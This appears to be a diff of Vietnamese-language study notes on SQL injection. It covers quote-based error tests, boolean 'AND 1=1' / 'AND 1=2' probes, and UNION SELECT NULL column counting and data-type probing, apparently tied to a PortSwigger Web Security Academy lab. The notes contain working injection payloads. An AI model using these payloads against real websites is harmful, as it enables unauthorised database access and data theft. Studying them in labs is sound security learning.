@@ -1,10 +1,10 @@
 Test 1: https://shop.com/product.php?id=8'
 → Error: You have an error in your SQL syntax near ''' 
 
-Test 2: https://shop.com/product.php?id=8 AND 1=1
+Test 2: https://shop.com/product.php?id=8' AND 1=1-- -
 → Hiển thị sản phẩm bình thường
 
-Test 3: https://shop.com/product.php?id=8 AND 1=2
+Test 3: https://shop.com/product.php?id=8' AND 1=2-- -
 → Không hiển thị gì (blank page)
 ✅ Kết luận: Có SQL Injection
 
@@ -37,13 +37,11 @@ Quan trọng: UNION chỉ hoạt động nếu hai SELECT có cùng số cột.
 Giờ tưởng tượng: Bạn không biết câu SELECT gốc trả về bao nhiêu cột. Nhưng bạn muốn viết một câu UNION khớp số cột với nó.
 Vì bạn chưa biết kiểu dữ liệu từng cột (số, chữ, ngày tháng,…), nên: dùng giá trị cụ thể (ví dụ 123, 'ABC') sẽ rất dễ sai kiểu.
 Còn NULL thì: là “trống” → database thấy ổn trong hầu hết kiểu cột.
-
 👉 Đó là lý do dùng:
 UNION SELECT NULL
 UNION SELECT NULL, NULL
 UNION SELECT NULL, NULL, NULL
 ...
-
 EXAMPLE
 https://0a2c009903bfc9a780a31c86004b004e.web-security-academy.net/filter category=Accessories
 Giả sử truy vấn gốc trong DB:
@@ -51,5 +49,10 @@ SELECT name, price FROM products WHERE category = 'Accessories' AND released = 1
 ta chèn ' UNION SELECT NULL-- sau Accessories trong URL sẽ thành:
 SELECT name, price FROM products WHERE category = 'Accessories' UNION SELECT NULL-- -' AND released = 1
 
-
-
+sau khi xác định được số cột theo cách bên trên, ta cần xác định kiểu dữ liệu, vì khi dùng UNION SELECT thì theo sau phải là các
+cột chứa kiểu dữ liệu khớp với truy vấn trước đó nên ta cũng thử các trường hợp dưới đây(giả sử đã tìm ra được rằng có 4 cột):
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+nếu báo lỗi thì thử tiếp khi không lỗi nữa thì oke.
